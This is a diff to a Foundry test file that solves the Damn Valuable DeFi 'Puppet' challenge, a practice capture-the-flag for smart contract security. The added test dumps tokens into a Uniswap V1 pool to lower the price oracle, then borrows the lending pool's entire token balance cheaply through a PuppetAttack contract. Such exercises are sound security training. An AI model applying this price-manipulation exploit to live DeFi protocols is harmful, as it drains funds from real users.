@@ -6,6 +6,7 @@ import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {PuppetPool} from "../../../src/Contracts/puppet/PuppetPool.sol";
+import {PuppetAttack} from "../../../src/Contracts/puppet/PuppetAttack.sol";
 
 interface UniswapV1Exchange {
     function addLiquidity(uint256 min_liquidity, uint256 max_tokens, uint256 deadline)
@@ -39,6 +40,8 @@ contract Puppet is Test {
     UniswapV1Exchange internal uniswapV1ExchangeTemplate;
     UniswapV1Exchange internal uniswapExchange;
     UniswapV1Factory internal uniswapV1Factory;
+    PuppetAttack internal puppetAttack;
+    
 
     DamnValuableToken internal dvt;
     PuppetPool internal puppetPool;
@@ -130,7 +133,36 @@ contract Puppet is Test {
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
+    
+    function testExploitContract() public {
+        /**
+         * EXPLOIT START *
+         */
+        // We will first do the exploit from here and then pivot to a contract mabye? 
 
+        //1. Let first check and see what them oracle prices like at the moment 
+        vm.prank(attacker);
+        dvt.balanceOf(address(uniswapExchange));
+
+    
+
+        //2. Lets try an manupulate the pool by removing as much eth as possible.
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapExchange), 1000e18);
+        uniswapExchange.tokenToEthSwapInput(1000e18,1,DEADLINE);
+      
+
+        //3. Whats the oracle price now to borrow DVT. // now you see :) 
+        uint256 priceToPay = puppetPool.calculateDepositRequired(100_000e18);
+
+        // 4. pay the pruce calculated in the Oracle\
+        puppetAttack = new PuppetAttack(address (puppetPool), address(dvt));
+        puppetAttack.performAttack{value: priceToPay}(100_000e18);
+        vm.stopPrank();
+        
+        validation();
+        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
+    }
     function validation() internal {
         // Attacker has taken all tokens from the pool
         assertGe(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
